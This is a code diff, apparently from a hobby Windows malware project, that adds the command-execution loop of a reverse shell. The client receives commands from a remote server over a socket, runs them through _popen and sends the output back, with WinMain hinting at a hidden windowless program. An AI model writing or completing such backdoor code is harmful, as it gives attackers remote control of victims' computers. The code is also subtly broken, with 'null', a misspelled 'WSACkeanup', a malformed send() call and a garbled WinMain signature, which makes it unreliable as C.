@@ -26,7 +26,31 @@ void Shell() {
 
         //recive from the server
         recv(sock, buffer, 1024, 0);
+        
+        if(strncmp("q", buffer, 1) == 0) {
+            break;
+        } else {
+            //execute command
+            FILE *file;
+            file = _popen(buffer, "r");
+            
+            //read response from stream ("file" in this case)
+            while(fgets(container, 1024, file) != null) {
+                //moves chars from container to total response
+                strcat(totalResponse, container);
+            }
+            send(sock, totalResponse, sizeof(totalResponse))
+            fclose(file);
+        }
     }
+    
+    //exit program
+    free(buffer);
+    free(container);
+    free(totalResponse);
+    closesocket(sock);
+    WSACkeanup();
+    exit(0);
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, int nCmdShow) {
